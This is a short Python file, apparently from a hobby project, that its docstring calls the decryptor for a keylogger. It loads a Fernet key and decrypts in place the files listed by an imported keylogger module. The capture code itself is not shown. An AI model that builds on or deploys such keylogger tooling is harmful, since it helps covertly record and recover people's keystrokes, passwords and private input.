'''
Developed by Orlando Companioni

This is the second version of the keylogger, it logs the keys pressed and the numbers pressed.
This is the decryptor for the keylogger.
'''
from cryptography.fernet import Fernet #This is for encryption
import Keylogger_2 as kl #This is the keylogger
def main():
    decryptor() #This function decrypts the files

def decryptor():
    #This function decrypts the files
    file_List=kl.get_fileList()
    with open('key_encrypt.key', 'rb') as key_file:
        key = key_file.read()
    fernet = Fernet(key)
    for file in file_List:
        with open(file, 'rb') as opened_file:
            encrypted = opened_file.read()
        decrypted = fernet.decrypt(encrypted)
        with open(file, 'wb') as file:
            file.write(decrypted)
        
if __name__ == "__main__":
    main()
